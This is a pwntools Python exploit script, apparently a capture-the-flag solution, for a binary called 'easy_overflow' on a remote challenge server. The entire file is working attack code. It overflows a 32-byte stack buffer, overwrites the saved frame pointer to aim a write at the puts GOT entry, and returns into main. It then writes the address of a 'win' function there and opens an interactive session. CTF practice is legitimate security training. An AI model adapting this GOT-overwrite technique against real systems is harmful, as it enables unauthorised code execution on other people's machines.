from pwn import *
from sys import *

elf = context.binary = ELF("./easy_overflow")
p = process("./easy_overflow")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

HOST = 'fun.chall.seetf.sg'
PORT = 50003

cmd = """
b*0x00000000004011a1
"""

if(argv[1] == 'gdb'):
	gdb.attach(p,cmd)
elif(argv[1] == 'rm'):
	p = remote(HOST,PORT)


payload = b'A'*32
payload += p64(elf.got['puts']+0x20)
payload += p64(elf.sym['main']+70)
p.sendline(payload)
p.sendline(p64(elf.sym['win']))
p.interactive()